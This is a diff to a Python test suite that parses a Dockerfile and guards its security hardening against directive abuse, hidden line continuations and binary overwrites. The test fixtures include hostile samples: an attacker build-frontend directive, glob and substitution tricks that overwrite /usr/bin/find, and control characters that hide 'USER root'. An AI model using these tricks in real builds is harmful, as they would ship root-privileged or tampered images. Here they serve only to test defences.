@@ -169,7 +169,7 @@ def _instructions(text: str | None = None) -> list[_Instruction]:
     # `# escape=` directive stops `\` continuing a line, so docker split a HEALTHCHECK that this
     # parser had swallowed whole and read the `USER root` hidden inside it as its own
     # instruction. Only the syntax directive is permitted; anything else is refused.
-    for raw in text.splitlines():
+    for raw in text.split("\n"):
         if not raw.strip().startswith("#"):
             break
         # BuildKit's own directive pattern tolerates whitespace on both sides of the `=`
@@ -179,16 +179,36 @@ def _instructions(text: str | None = None) -> list[_Instruction]:
         # split a HEALTHCHECK this parser had swallowed whole, and left the resolved user root
         # with the whole suite green. A single space reopened the hole the check was added to
         # close, so the pattern is now BuildKit's, not an approximation of it.
+        #
+        # EVERY directive is refused, `syntax` included. The previous version checked the
+        # directive's NAME and never looked at its VALUE, so `# syntax=attacker.example/
+        # evil-frontend:latest` passed 292 of 292 tests. A syntax value is a build frontend
+        # image: BuildKit pulls it and hands it this file and the whole build context, and it
+        # may emit any image it likes, which makes every assertion in this file a statement
+        # about a document nothing executes. Pinning the value by digest would close that, but
+        # this build needs no BuildKit-only feature, so the directive is gone from the
+        # Dockerfile and refused here instead. That is one fewer network pull in the build and
+        # one fewer thing to keep pinned.
         found = re.match(r"^#\s*([A-Za-z][A-Za-z0-9_.-]*)\s*=", raw)
         if found is not None:
-            assert found.group(1).lower() == "syntax", (
-                f"unrecognised parser directive {found.group(1)!r}; a directive changes how "
-                "docker reads this file and is invisible to a line-based parser"
+            raise AssertionError(
+                f"parser directive {found.group(1)!r} present; a directive changes how docker "
+                "reads this file, or which frontend reads it at all, and is invisible to a "
+                "line-based parser. This build needs none."
             )
     joined: list[str] = []
     buffer = ""
-    for raw in text.splitlines():
-        line = raw.split("#")[0].rstrip() if raw.lstrip().startswith("#") else raw.rstrip()
+    # BuildKit's line model, not Python's. `scanLines` splits on "\n" ALONE and `trimNewline`
+    # trims "\r\n" ALONE, so those are the only characters that may come off a line end before
+    # the continuation rule is applied. This parser used `str.splitlines()` and a blanket
+    # `rstrip()`, and both are wider: splitlines breaks at VT, FF, 0x1c-0x1e, NEL and U+2028,
+    # and rstrip strips those plus NBSP and every Unicode space. Either width made a line
+    # ending `\` + VT a continuation here and a COMPLETE instruction to docker, so
+    # `LABEL org.opencontainers.image.title=pree\<0x0b>` above `USER root` swallowed the USER
+    # into a LABEL argument: 292 tests green, shipped user root, and a 0x0b invisible in an
+    # editor and in a diff. That is the round-twenty blocker reopened one byte to the side.
+    for raw in text.split("\n"):
+        line = raw.rstrip("\r\n")
         if line.lstrip().startswith("#") or not line.strip():
             continue
         # BuildKit's own rule, taken from its parser rather than approximated:
@@ -202,7 +222,10 @@ def _instructions(text: str | None = None) -> list[_Instruction]:
         # space. Inserting one meant a path split mid-token across a continuation resolved to
         # something harmless here and to the real target for docker: `/usr/bi` + `\\` + newline
         # + `n/find` read as `/app/n/find` and passed, while docker wrote `/usr/bin/find`.
-        buffer += line[:-1] if continues else line
+        # Cut at the backslash rather than at the last character: with only "\r\n" trimmed
+        # above, a continuation may carry trailing spaces or tabs after the `\`, exactly as
+        # BuildKit's own `trimContinuationCharacter` allows.
+        buffer += line[: line.rindex("\\")] if continues else line
         if not continues:
             joined.append(buffer.strip())
             buffer = ""
@@ -309,6 +332,122 @@ def test_the_parser_follows_buildkit_continuation_semantics() -> None:
     bare = _instructions("FROM scratch\nRUN echo one \\\n && echo two\n")
     assert [i.keyword for i in bare] == ["FROM", "RUN"], [i.keyword for i in bare]
 
+    # A backslash followed by a space or a tab IS a continuation, because BuildKit's rule
+    # tolerates `[ \t]*` after it. Trimming only "\r\n" leaves that whitespace on the line, so
+    # the joiner has to cut at the backslash rather than at the last character.
+    for tail in (" ", "\t", "  \t "):
+        padded = _instructions(f"FROM scratch\nCOPY a /usr/bi\\{tail}\nn/find\n")
+        assert [i.keyword for i in padded] == ["FROM", "COPY"], [i.keyword for i in padded]
+        assert padded[-1].argument == "a /usr/bin/find", (
+            f"a continuation padded with {tail!r} was mis-joined: {padded[-1].argument!r}"
+        )
+
+    # And a backslash followed by anything ELSE is NOT a continuation, because docker trims only
+    # "\r\n" from a line end and tolerates only `[ \t]` after the backslash. Every carrier below
+    # is whitespace to `str.rstrip()` or a line break to `str.splitlines()`, and the parser used
+    # both: a LABEL ending `\` + VT swallowed the USER root on the next line while docker read
+    # two instructions and shipped root. The carriers are, in order: VT, FF, the C1 line
+    # separators, NEL, NBSP, EN QUAD, IDEOGRAPHIC SPACE, and LINE SEPARATOR.
+    for carrier in (
+        "\x0b",
+        "\x0c",
+        "\x1c",
+        "\x1d",
+        "\x1e",
+        "\x85",
+        "\xa0",
+        "\u2000",
+        "\u3000",
+        "\u2028",
+    ):
+        text = f"FROM scratch\nLABEL title=pree\\{carrier}\nUSER root\n"
+        hidden = _instructions(text)
+        keywords = [i.keyword for i in hidden]
+        assert keywords == ["FROM", "LABEL", "USER"], (
+            f"a trailing backslash followed by {carrier!r} was read as a continuation, so the "
+            f"next instruction vanished: {keywords}"
+        )
+        assert hidden[-1].argument == "root", hidden[-1].argument
+
+    # CRLF line endings throughout, which is the one trailing character docker does trim.
+    crlf = _instructions("FROM scratch\r\nCOPY a /usr/bi\\\r\nn/find\r\nUSER 10001:10001\r\n")
+    assert [i.keyword for i in crlf] == ["FROM", "COPY", "USER"], [i.keyword for i in crlf]
+    assert crlf[1].argument == "a /usr/bin/find", crlf[1].argument
+
+
+def test_the_claim_unit_splitter_pairs_a_colon_sentence_with_what_follows(
+    tmp_path: Path,
+) -> None:
+    """The prose-to-claim splitter, exercised directly, because it had two defects nobody saw.
+
+    It raised UnboundLocalError on any document opening with a table row, and its colon pairing
+    reached a table row and nothing else, so a wrong floor written as a bullet, a fenced block or
+    a heading-then-row passed. The house style bullets with `●`, which made the bullet shape the
+    likeliest of the four.
+    """
+    # No crash on a document whose first non-blank line is a table row.
+    row_first = tmp_path / "row-first.md"
+    row_first.write_text("| rule | value |\n| --- | --- |\n| minimum | 32 |\n", encoding="utf-8")
+    assert _claim_units(row_first), "a document opening with a table row produced no units"
+
+    for name, body in (
+        ("bullet", "The floor is:\n\n● 16 characters, minimum.\n"),
+        ("fence", "The floor is:\n\n```\n16 characters\n```\n"),
+        ("heading", "The floor is:\n\n### Floor\n\n| minimum | 16 characters |\n"),
+        ("row", "The floor is:\n\n| minimum | 16 characters |\n"),
+    ):
+        document = tmp_path / f"{name}.md"
+        document.write_text(body, encoding="utf-8")
+        units = _claim_units(document)
+        assert any("The floor is:" in unit and "16" in unit for unit in units), (
+            f"the colon sentence did not reach the {name} carrying the number: {units}"
+        )
+
+    # And the reach is BOUNDED, or a colon sentence runs together with the next section and the
+    # guard starts flagging true statements two paragraphs away.
+    far = tmp_path / "far.md"
+    far.write_text(
+        "The floor is:\n\n● one\n\n● two\n\n● three\n\n● four\n\nA later 16 appears here.\n",
+        encoding="utf-8",
+    )
+    assert not any("The floor is:" in unit and "16" in unit for unit in _claim_units(far)), (
+        "the colon sentence reached past its block and would flag an unrelated statement"
+    )
+
+
+def test_no_parser_directive_survives_the_first_line() -> None:
+    """A directive is a comment to every line-based reader and an instruction to docker.
+
+    The version this replaces asserted the directive's NAME was `syntax` and never looked at its
+    VALUE, so `# syntax=attacker.example/evil-frontend:latest` passed the whole suite: a
+    frontend image of the attacker's choosing, handed this file and the build context, free to
+    emit any image at all. The shipped `docker/dockerfile:1` was itself a floating tag in a file
+    that pins its bases by digest.
+    """
+    assert not _dockerfile().startswith("# syntax"), (
+        "the Dockerfile opens with a syntax directive again; it names a build frontend image "
+        "that receives the whole build context, and this build needs no BuildKit-only feature"
+    )
+    for directive in (
+        "# syntax=docker/dockerfile:1",
+        "# syntax = docker/dockerfile:1",
+        "# syntax=attacker.example/evil-frontend:latest",
+        "# escape=`",
+        "# escape = `",
+        "#check=skip=all",
+    ):
+        with pytest.raises(AssertionError, match="parser directive"):
+            _instructions(f"{directive}\nFROM scratch\nUSER 10001:10001\n")
+
+    # A comment that contains an equals sign somewhere OTHER than the directive position is
+    # ordinary prose, and the shipped file's leading block is full of it. The refusal is
+    # deliberately wider than BuildKit's own directive table: BuildKit treats an unknown
+    # `# name=value` as a plain comment, but this parser cannot tell a comment from a directive
+    # docker learns to honour in a later release, so the shape is refused and the leading block
+    # is written without it. Fail closed, at the cost of one comment style.
+    ordinary = _instructions("# the venv PATH is set with ENV PATH=... below\nFROM scratch\n")
+    assert [i.keyword for i in ordinary] == ["FROM"], [i.keyword for i in ordinary]
+
 
 def test_the_sentence_splitter_does_not_break_at_an_abbreviation() -> None:
     """`e.g. 16 characters` lost its subject to the previous half and a wrong floor passed."""
@@ -320,20 +459,6 @@ def test_the_sentence_splitter_does_not_break_at_an_abbreviation() -> None:
     assert _sentences("A floor applies, i.e. 32 characters.") == [
         "A floor applies, i.e. 32 characters."
     ]
-
-
-def test_a_run_that_builds_a_path_opaquely_is_refused() -> None:
-    """The RUN branch read literals only, so a glob or a substitution reached the binary."""
-    for opaque in (
-        "RUN cp /etc/hostname /usr/b?n/find",
-        "RUN D=/usr/b; cp /etc/hostname ${D}in/find",
-        "RUN cp /etc/hostname `echo /usr/bin/find`",
-        "RUN cp /etc/hostname /usr/[b]in/find",
-    ):
-        collapsed = " ".join(opaque.split()[1:])
-        assert any(char in collapsed for char in ("$", "`", "?", "[", "]")), (
-            f"this fabrication carries no opaque character, so the refusal cannot see it: {opaque}"
-        )
 
 
 def test_the_dockerfile_sits_at_the_repository_root() -> None:
@@ -596,15 +721,22 @@ def test_the_launch_command_refuses_to_trust_a_forwarded_client_address() -> Non
     )
 
 
-def test_nothing_writes_over_a_binary_the_hardening_steps_depend_on() -> None:
-    """Pinning a command's text is worthless if its binaries can be replaced.
+def _binary_write_offences(instructions: list[_Instruction]) -> list[str]:
+    """Every instruction that could replace a binary the hardening steps name.
 
-    `COPY --from=build /bin/true /usr/bin/find` above the sweep is one line, changes not a
-    character of the pinned command, and leaves every other assertion green while the sweep
-    clears nothing. Absolute paths in the sweep close the PATH route; this closes the other one.
+    A CALLABLE, taking the instructions as an argument, because the test that used to hold this
+    logic could only ever run it against the shipped Dockerfile. The reviewer deleted the
+    opaque-path refusal below and all 292 tests stayed green: the test written to prove that
+    refusal works asserted only that its own four string constants contained a refused
+    character, which is a tautology over literals. A helper can be fed synthetic input, so the
+    refusal is now exercised directly by `test_the_write_guard_refuses_a_path_built_opaquely`.
+
+    Returns the offences it finds; RAISES for the categorical refusals (ADD, a variable in a
+    COPY destination, an opaque character in a non-vetted RUN), because those are refusals of a
+    construction rather than findings about a path.
     """
     offenders: list[str] = []
-    for instruction in _instructions():
+    for instruction in instructions:
         if instruction.keyword not in {"COPY", "ADD"}:
             continue
         # Resolved against the WORKDIR in force, and stripped of quoting and JSON punctuation.
@@ -663,7 +795,7 @@ def test_nothing_writes_over_a_binary_the_hardening_steps_depend_on() -> None:
     # a RUN that touches /usr/bin means adding it to _VETTED_RUNS deliberately, which is a
     # decision someone has to make and a reviewer can see.
     vetted = {" ".join(text.split()) for text in _VETTED_RUNS}
-    for instruction in _instructions():
+    for instruction in instructions:
         if instruction.keyword != "RUN":
             continue
         collapsed = " ".join(instruction.argument.split())
@@ -673,9 +805,20 @@ def test_nothing_writes_over_a_binary_the_hardening_steps_depend_on() -> None:
         # branch has refused `$` since round sixteen on exactly this reasoning, and the RUN
         # branch read literals only, so three forms walked through: `/usr/b?n/find` (a glob that
         # matches a binary present in the base image), `D=/usr/b; … ${D}in/find`, and
-        # `"$(printf '/usr/%s/find' bin)"`. The five vetted RUNs contain none of these
-        # characters except `*`, so refusing them costs nothing.
-        for opaque in ("$", "`", "?", "[", "]"):
+        # `"$(printf '/usr/%s/find' bin)"`.
+        #
+        # `*` was MISSING from this tuple, and it is the most natural glob of the set:
+        # `RUN cp /usr/b*n/true /usr/b*n/find` passed 292 of 292 tests, resolved to
+        # /usr/bin/find, and left every setuid and setgid bit in the base image shipped. The
+        # same attack as `/usr/b?n/find`, one metacharacter over. Brace expansion is the third
+        # spelling, so `{` and `}` go with it.
+        #
+        # Refusing them costs NOTHING, and the comment that used to sit here said otherwise: it
+        # claimed the vetted RUNs "contain none of these characters except `*`", which is beside
+        # the point. A vetted RUN never reaches this loop; the `continue` above exempts it by
+        # exact text first. The cost of a refused character is only ever borne by a RUN somebody
+        # adds without vetting it.
+        for opaque in ("$", "`", "?", "*", "[", "]", "{", "}"):
             assert opaque not in collapsed, (
                 f"a RUN builds a path from a substitution or a glob, so what it writes cannot be "
                 f"read from this file ({opaque!r}): {collapsed[:80]}"
@@ -689,9 +832,67 @@ def test_nothing_writes_over_a_binary_the_hardening_steps_depend_on() -> None:
                 offenders.append(f"RUN touches {bare}: {collapsed[:80]}")
                 break
 
+    return offenders
+
+
+def test_nothing_writes_over_a_binary_the_hardening_steps_depend_on() -> None:
+    """Pinning a command's text is worthless if its binaries can be replaced.
+
+    `COPY --from=build /bin/true /usr/bin/find` above the sweep is one line, changes not a
+    character of the pinned command, and leaves every other assertion green while the sweep
+    clears nothing. Absolute paths in the sweep close the PATH route; this closes the other one.
+    """
+    offenders = _binary_write_offences(_instructions())
     assert not offenders, (
         f"an instruction writes into a system executable directory, so the binaries the "
         f"hardening steps name may not be the binaries that run: {offenders}"
+    )
+
+
+def test_the_write_guard_refuses_a_path_built_opaquely() -> None:
+    """The GUARD is invoked here, on synthetic input, not asserted about.
+
+    The test this replaces looped over four fabrications and asserted that each contained one of
+    the refused characters: a statement about its own string constants, true whatever the guard
+    does. Deleting the refusal loop outright left all 292 tests green, which is the same defect
+    the fabrications were written to catch, one level up.
+    """
+    for fabrication in (
+        "RUN cp /etc/hostname /usr/b?n/find",
+        "RUN cp /usr/b*n/true /usr/b*n/find",
+        "RUN D=/usr/b; cp /etc/hostname ${D}in/find",
+        "RUN cp /etc/hostname `echo /usr/bin/find`",
+        "RUN cp /etc/hostname /usr/[b]in/find",
+        "RUN cp /etc/hostname /usr/{bin,sbin}/find",
+        "RUN cp /etc/hostname \"$(printf '/usr/%s/find' bin)\"",
+    ):
+        with pytest.raises(AssertionError, match="builds a path from a substitution or a glob"):
+            _binary_write_offences(_instructions(f"FROM scratch AS prep\n{fabrication}\n"))
+
+    # A LITERAL write is a finding rather than a refusal, so it comes back in the list.
+    for literal in (
+        "RUN cp /bin/true /usr/bin/find",
+        "RUN /bin/cat /bin/true > /usr/bin/find",
+        "RUN tar -xf payload.txt -C /usr/bin/",
+    ):
+        found = _binary_write_offences(_instructions(f"FROM scratch AS prep\n{literal}\n"))
+        assert found, f"a literal write into an executable directory was not seen: {literal}"
+
+    # COPY and ADD, the two branches above the RUN branch.
+    copy = _binary_write_offences(
+        _instructions("FROM scratch AS prep\nCOPY --from=build /bin/true /usr/bin/find\n")
+    )
+    assert copy, "a COPY over /usr/bin/find was not seen"
+    with pytest.raises(AssertionError, match="extracts a local archive"):
+        _binary_write_offences(_instructions("FROM scratch AS prep\nADD hardening.txt /usr/bin/\n"))
+    with pytest.raises(AssertionError, match="destination is built from a variable"):
+        _binary_write_offences(
+            _instructions("FROM scratch AS prep\nCOPY --from=build /bin/true ${D}/find\n")
+        )
+
+    # And a vetted RUN passes, which is what stops the refusal from being unusable.
+    assert not _binary_write_offences(_instructions(f"FROM scratch AS prep\nRUN {SUID_SWEEP}\n")), (
+        "the shipped suid sweep is refused by its own guard"
     )
 
 
@@ -866,6 +1067,35 @@ def _introduces_a_table(sentences: list[str]) -> str | None:
     return last if last.endswith(":") else None
 
 
+# A colon sentence pairs with this many following units before it is dropped. Three covers a
+# heading and its table row, or a bullet list's first two items, and stops short of running the
+# sentence together with the next section.
+_PAIRING_REACH = 3
+
+
+def _paired(pending: str | None, sentences: list[str]) -> list[str]:
+    """The sentences themselves, plus each one joined to the colon sentence introducing them."""
+    if not pending:
+        return list(sentences)
+    return list(sentences) + [f"{pending} {sentence}" for sentence in sentences]
+
+
+def _next_pending(sentences: list[str], pending: str | None, reach: int) -> tuple[str | None, int]:
+    """The colon sentence in force after this flush, and how much further it reaches.
+
+    A new colon sentence replaces the old one. Otherwise the old one survives, one unit shorter,
+    which is what lets it cross a `###` heading or a bullet to reach the row or the item that
+    carries the number.
+    """
+    introduces = _introduces_a_table(sentences)
+    if introduces is not None:
+        return introduces, _PAIRING_REACH
+    if pending is None:
+        return None, 0
+    remaining = reach - 1
+    return (pending, remaining) if remaining > 0 else (None, 0)
+
+
 def _claim_units(path: Path) -> list[str]:
     """SENTENCES, not line windows, plus each table row whole.
 
@@ -884,38 +1114,54 @@ def _claim_units(path: Path) -> list[str]:
     ]
     units: list[str] = []
     prose: list[str] = []
+    # INITIALISED here, not at first assignment inside the loop. `pending` was read at the table
+    # branch below and only ever written further down, so any document whose first non-blank
+    # line was a table row raised UnboundLocalError: a crash in the guard rather than a silent
+    # pass, but neither ruff nor mypy saw it and a crashing guard proves nothing.
+    pending: str | None = None
+    # How many further units a colon sentence keeps pairing with. A sentence ending in a colon
+    # introduces a BLOCK, and the block is not always a table: the house style bullets with `●`,
+    # so "The floor for the team token is:" / blank / "● 16 characters, minimum." was the most
+    # likely shape of a wrong floor and the pairing did not survive to reach it. Nor did the
+    # heading-then-table shape, nor a fenced code block. Pairing with the next few units instead
+    # of the next row alone covers all four. Bounded, because pairing indefinitely runs a colon
+    # sentence together with the next section and starts flagging true statements.
+    reach = 0
     for line in lines:
         if line.startswith("|"):
             if prose:
                 sentences = _sentences(" ".join(prose))
-                units.extend(sentences)
+                units.extend(_paired(pending, sentences))
                 # The LAST prose sentence pairs with this row. "The floor is the value in this
                 # table:" followed by `| minimum | 16 characters |` split the subject from the
                 # number, because prose was flushed at the first row and rows paired only with
                 # rows.
-                pending = _introduces_a_table(sentences)
+                pending, reach = _next_pending(sentences, pending, reach)
                 prose = []
             units.append(line)
             # Separator rows carry no claim, so pairing with one says nothing and the pending
             # sentence must survive to reach the row that does.
             if pending and not re.fullmatch(r"\|[\s|:-]+\|", line):
                 units.append(f"{pending} {line}")
+                reach -= 1
+                if reach <= 0:
+                    pending = None
             continue
         # Blank lines do NOT reset the pairing. Markdown puts one between a paragraph and the
         # table it introduces, so resetting there meant "the floor is the value in this table:"
-        # never reached the row carrying the number. Only real prose ends the pairing.
-        if line:
-            pending = None
+        # never reached the row carrying the number. Only real prose ends the pairing, and only
+        # once the colon sentence has reached the units it introduces.
         if not line:
             if prose:
                 sentences = _sentences(" ".join(prose))
-                units.extend(sentences)
-                pending = _introduces_a_table(sentences)
+                units.extend(_paired(pending, sentences))
+                pending, reach = _next_pending(sentences, pending, reach)
                 prose = []
             continue
         prose.append(re.sub(r"^\d+\.\s+", "", line.strip(" ●■")))
     if prose:
-        units.extend(_sentences(" ".join(prose)))
+        sentences = _sentences(" ".join(prose))
+        units.extend(_paired(pending, sentences))
     # Adjacent table rows too, for a floor split across a header row and its value row.
     units += [
         f"{first} {second}"
